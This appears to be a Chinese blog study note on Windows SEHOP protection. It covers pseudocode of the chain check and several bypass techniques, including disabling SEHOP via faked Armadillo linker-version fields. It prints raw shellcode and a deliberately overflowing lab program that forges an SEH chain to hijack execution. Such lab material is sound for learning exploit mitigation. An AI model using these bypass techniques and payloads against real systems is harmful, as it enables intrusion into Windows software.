---
title: 漏洞利用学习笔记-020-SEHOP简介
description: SEHOP的介绍和一点简单攻击
date: 2020-11-28 15:38:00+0800
categories:
    - 漏洞利用
tags:
    - Windows
    - 结构化异常处理覆盖保护
---

本文来源：[Moeomu的博客](/zh-cn/posts/漏洞利用学习笔记-020-sehop简介/)

## 简介

SEHOP的核心任务就是检查S.E.H链的完整性，在程序转入异常处理前SEHOP会检查S.E.H链上最后一个异常处理函数是否为系统固定的终极异常处理函数。如果是，则说明这条S.E.H链没有被破坏，程序可以去执行当前的异常处理函数；如果检测到最后一个异常处理函数不是，则说明S.E.H链被破坏，可能发生了S.E.H覆盖攻击，程序将不会去执行当前的异常处理函数

> SEHOP验证伪代码

```cpp
if (process_flags & 0x40 == 0)  // 如果没有SEH记录则不进行检测
{
    if (record != 0xFFFFFFFF)  // 开始检测
    {
        do
        {
            if (record < stack_bottom || record > stack_top) // SEH 记录必须位于栈中
                goto corruption;
            if ((char *)record + sizeof(EXCEPTION_REGISTRATION) > stack_top) // SEH 记录结构需完全在栈中
                goto corruption;
            if ((record & 3) != 0) // SEH记录必须4字节对齐
                goto corruption;
            handler = record->handler;
            if (handler >= stack_bottom && handler < stack_top) // 异常处理函数地址不能位于栈中
                goto corruption;
            record = record->next;
        } while (record != 0xFFFFFFFF); // 遍历S.E.H链
    }
    if ((TEB->word_at_offset_0xFCA & 0x200) != 0)
    {
        if (handler != &FinalExceptionHandler) // 核心检测，地球人都知道，不解释了
        goto corruption;
    }
}
```

## 攻击思路

### 攻击返回地址

> 如果此函数启用了SEHOP但是没有启用GS或者函数刚好没有启用GS那么直接攻击返回地址即可

### 攻击虚函数

> SEHOP只保护SEH，但是虚函数表它并没有保护，攻击虚函数依旧可以成功

### 利用未启用SEHOP的模块

> 微软为一些加密壳禁用了SEHOP，例如穿山甲Armadilo

- 操作系统会根据PE头中`MajorLinkerVersion`和`MinorLinkerVersion`两个选项来判断是否为程序禁用SEHOP。例如，我们可以将这两个选项分别设置为`0x53`和`0x52`来模拟经过`Armadilo`加壳的程序，从而达到禁用SEHOP的目的
- Windows 7以及以后的系统中`PEB_LDR_DATA`指向的第二个模块被`KernelBase.dll`占据，所以shellcode应该修改一下

```c
Shellcode_for_windows7=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09"
"\x8B\x09" // 在这增加机器码\x8B\x09，它对应的汇编为mov ecx,[ecx]
"\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
;
```

### 伪造SEH链表

> 前提：ASLR不启用

- 思路
  - 通过未启用`SafeSEH`的`SEH_NOSafeSEH_JUMP.dll`来绕过`SafeSEH`
  - 通过伪造S.E.H链，造成S.E.H链未被破坏的假象来绕过`SEHOP`
  - `SEH_NOSafeSEH`中的test函数存在一个典型的溢出，即通过向str复制超长字符串造成str溢出，进而覆盖程序的S.E.H信息
  - 使用`SEH_NOSafeSEH_JUMP.DLL`中的`pop pop retn`指令地址覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理
  - 通过劫持异常处理流程，程序转入`SEH_NOSaeSEH_JUMP.DLL`中执行`pop pop retn`指令，在执行`retn`后程序转入`shellcode`执行

- 代码

```cpp
#include <string.h>
#include <windows.h>

char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x14\xFF\x12\x00" // address of last seh record
"\x12\x10\x12\x11" // address of pop pop retn in No_SafeSEH module
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09"
"\x8B\x09" // 在这增加机器码\x8B\x09，它对应的汇编为mov ecx,[ecx]
"\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90"
"\xFF\xFF\xFF\xFF" // the fake seh record
"\x75\xA8\xF7\x77"
;

DWORD MyException(void)
{
    printf("There is an exception");
    getchar();
    return 1;
}

void test(char * input)
{
    char str[200];
    memcpy(str, input, 412);
    int zero = 0;
    __try
    {
        zero = 1 / zero;
    }
    __except(MyException()){}
}

int main()
{
    HINSTANCE hInst = LoadLibrary(_T("SEH_NOSaeSEH_JUMP.dll")); // load No_SafeSEH module
    char str[200];
    test(shellcode);
    return 0;
}
```
